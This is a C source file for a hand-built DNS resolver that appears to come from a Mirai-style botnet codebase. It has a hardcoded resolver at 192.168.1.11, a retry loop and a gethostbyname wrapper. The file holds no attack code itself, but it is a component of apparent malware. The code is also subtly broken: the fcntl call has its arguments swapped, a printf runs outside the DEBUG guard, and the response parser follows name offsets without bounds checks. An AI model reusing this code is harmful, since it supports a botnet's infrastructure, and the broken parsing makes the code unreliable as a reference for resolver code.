#define _GNU_SOURCE

#define DEBUG 1

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <fcntl.h>
#include <sys/select.h>
#include <errno.h>
#include <string.h>
#include <netdb.h>

#include "includes.h"
#include "resolv.h"
#include "util.h"
#include "rand.h"
#include "protocol.h"

void resolv_domain_to_hostname(char *dst_hostname, char *src_domain)
{
    int len = util_strlen(src_domain) + 1;
    char *lbl = dst_hostname, *dst_pos = dst_hostname + 1;
    uint8_t curr_len = 0;

    while (len-- > 0)
    {
        char c = *src_domain++;

        if (c == '.' || c == 0)
        {
            *lbl = curr_len;
            lbl = dst_pos++;
            curr_len = 0;
        }
        else
        {
            curr_len++;
            *dst_pos++ = c;
        }
    }
    *dst_pos = 0;
}

static void resolv_skip_name(uint8_t *reader, uint8_t *buffer, int *count)
{
    unsigned int jumped = 0, offset;
    *count = 1;
    while (*reader != 0)
    {
        if (*reader >= 192)
        {
            offset = (*reader) * 256 + *(reader + 1) - 49152;
            reader = buffer + offset - 1;
            jumped = 1;
        }
        reader = reader + 1;
        if (jumped == 0)
            *count = *count + 1;
    }

    if (jumped == 1)
        *count = *count + 1;
}

struct resolv_entries* resolv_lookup(char* domain) {
    struct hostent *host;
    struct resolv_entries *entries = malloc(sizeof(struct resolv_entries));

    if (entries == NULL) {
        perror("Memory allocation failed");
        return NULL;
    }

    host = gethostbyname(domain);

    if (host == NULL) {
        fprintf(stderr, "[resolv %d] Failed to resolve domain: %s\n", getpid(), domain);
        free(entries);
        return NULL;
    }

    entries->addrs_len = 0;

    // Count the number of IP addresses returned
    while (host->h_addr_list[entries->addrs_len] != NULL)
        entries->addrs_len++;

    entries->addrs = malloc(entries->addrs_len * sizeof(struct in_addr));

    if (entries->addrs == NULL) {
        perror("Memory allocation failed");
        free(entries);
        return NULL;
    }

    // Copy the IP addresses to the resolv_entries structure
    for (uint8_t i = 0; i < entries->addrs_len; i++) {
        ipv4_t *addr = (ipv4_t *)host->h_addr_list[i];
        entries->addrs[i] = *addr;
    }

    return entries;
}

struct resolv_entries *resolv_lookup_0(char *domain)
{
    printf("resolv_lookup(\"%s\")\n", domain);

    struct resolv_entries *entries = calloc(1, sizeof(struct resolv_entries));
    char query[2048], response[2048];
    struct dnshdr *dnsh = (struct dnshdr *)query;
    char *qname = (char *)(dnsh + 1);

    resolv_domain_to_hostname(qname, domain);

    struct dns_question *dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
    struct sockaddr_in addr = {0};
    int query_len = sizeof(struct dnshdr) + util_strlen(qname) + 1 + sizeof(struct dns_question);
    int tries = 0, fd = -1, i = 0;
    uint16_t dns_id = rand_next() % 0xffff;

    util_zero(&addr, sizeof(struct sockaddr_in));
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INET_ADDR(192, 168, 1, 11);
    addr.sin_port = htons(53);

    // Set up the dns query
    dnsh->id = dns_id;
    dnsh->opts = htons(1 << 8); // Recursion desired
    dnsh->qdcount = htons(1);
    dnst->qtype = htons(PROTO_DNS_QTYPE_A);
    dnst->qclass = htons(PROTO_DNS_QCLASS_IP);

    while (tries++ < 5) {
        fd_set fdset;
        struct timeval timeo;
        int nfds;

        if (fd != -1)
            close(fd);
        if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
#ifdef DEBUG
            printf("[resolv] Failed to create socket\n");
#endif
            usleep(10000);
            continue;
        }

        if (connect(fd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) == -1) {
#ifdef DEBUG
            printf("[resolv] Failed to call connect on udp socket\n");
#endif
            usleep(10000);
            continue;
        }

        if (send(fd, query, query_len, MSG_NOSIGNAL) == -1) {
#ifdef DEBUG
            printf("[resolv] Failed to send packet: %d\n", errno);
#endif
            usleep(10000);
            continue;
        }

        fcntl(F_SETFL, fd, O_NONBLOCK | fcntl(F_GETFL, fd, 0));
        FD_ZERO(&fdset);
        FD_SET(fd, &fdset);

        timeo.tv_sec = 5;
        timeo.tv_usec = 0;
        nfds = select(fd + 1, &fdset, NULL, NULL, &timeo);

        if (nfds == -1) {
#ifdef DEBUG
            printf("[resolv] select() failed\n");
#endif
            break;
        } else if (nfds == 0) {
#ifdef DEBUG
            printf("[resolv] Couldn't resolve %s in time. %d tr%s\n", domain, tries, tries == 1 ? "y" : "ies");
#endif
            continue;
        } else if (FD_ISSET(fd, &fdset)) {
#ifdef DEBUG
            printf("[resolv] Got response from select\n");
#endif
            int ret = recvfrom(fd, response, sizeof(response), MSG_NOSIGNAL, NULL, NULL);
            char *name;
            struct dnsans *dnsa;
            uint16_t ancount;
            int stop;

            if (ret < (sizeof(struct dnshdr) + util_strlen(qname) + 1 + sizeof(struct dns_question)))
                continue;

            dnsh = (struct dnshdr *)response;
            qname = (char *)(dnsh + 1);
            dnst = (struct dns_question *)(qname + util_strlen(qname) + 1);
            name = (char *)(dnst + 1);

            if (dnsh->id != dns_id)
                continue;
            if (dnsh->ancount == 0)
                continue;

            ancount = ntohs(dnsh->ancount);
            while (ancount-- > 0) {
                struct dns_resource *r_data = NULL;

                resolv_skip_name(name, response, &stop);
                name = name + stop;

                r_data = (struct dns_resource *)name;
                name = name + sizeof(struct dns_resource);

                if (r_data->type == htons(PROTO_DNS_QTYPE_A) && r_data->_class == htons(PROTO_DNS_QCLASS_IP)) {
                    if (ntohs(r_data->data_len) == 4) {
                        uint32_t *p;
                        uint8_t tmp_buf[4];
                        for (i = 0; i < 4; i++)
                            tmp_buf[i] = name[i];

                        p = (uint32_t *)tmp_buf;

                        entries->addrs = realloc(entries->addrs, (entries->addrs_len + 1) * sizeof(ipv4_t));
                        entries->addrs[entries->addrs_len++] = (*p);
#ifdef DEBUG
                        printf("[resolv] Found IP address: %08x\n", (*p));
#endif
                    }

                    name = name + ntohs(r_data->data_len);
                } else {
                    resolv_skip_name(name, response, &stop);
                    name = name + stop;
                }
            }
        }

        break;
    }

    close(fd);

#ifdef DEBUG
    printf("Resolved %s to %d IPv4 addresses\n", domain, entries->addrs_len);
#endif

    if (entries->addrs_len > 0)
        return entries;
    else {
        resolv_entries_free(entries);
        return NULL;
    }
}

void resolv_entries_free(struct resolv_entries *entries)
{
    if (entries == NULL)
        return;
    if (entries->addrs != NULL)
        free(entries->addrs);
    free(entries);
}
